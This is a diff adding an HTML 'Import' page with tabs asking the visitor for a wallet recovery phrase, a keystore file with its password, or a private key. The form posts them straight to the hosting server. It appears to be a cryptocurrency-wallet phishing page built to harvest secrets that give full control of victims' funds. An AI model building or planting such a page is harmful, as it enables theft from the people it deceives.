@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Import</title>
+    <link rel="stylesheet" href="import.css" />
+  </head>
+  <body>
+    <form action="/" class="import-cont" method="post">
+      <div class="head-tabs">
+        <div id="phrase" onclick="changeTab('phrase')">Phrase</div>
+        <div id="keystore" onclick="changeTab('keystore')">KeystoreJSN</div>
+        <div id="privatekey" onclick="changeTab('privatekey')">PrivateKey</div>
+      </div>
+      <div class="phrase">
+        <textarea
+          name="phraseText"
+          id="ptext"
+          cols="30"
+          rows="8"
+          placeholder="Enter 12 or 24 phrase code"
+        ></textarea>
+      </div>
+      <div class="keystore">
+        <textarea
+          name="keyStore"
+          id="kstore"
+          cols="30"
+          rows="10"
+          placeholder="Enter Lines of Text beginning with (...)"
+        ></textarea>
+        <input
+          type="text"
+          name="keystorePassword"
+          id="kpassword"
+          placeholder="Enter Keystore Password"
+        />
+      </div>
+      <div class="privatekey">
+        <textarea
+          name="privateKey"
+          id="pkey"
+          cols="30"
+          rows="10"
+          placeholder="Enter Private Key"
+        ></textarea>
+      </div>
+      <button type="submit">Import</button>
+    </form>
+
+    <script>
+      let currentTab = "phrase";
+
+      function changeTab(newTab) {
+        document.querySelector(`.${currentTab}`).style.display = "none";
+        document.querySelector(`#${currentTab}`).style.backgroundColor =
+          "white";
+
+        document.querySelector(`.${newTab}`).style.display = "block";
+        document.querySelector(`#${newTab}`).style.backgroundColor = "#92e4fd";
+
+        currentTab = newTab;
+      }
+    </script>
+  </body>
+</html>
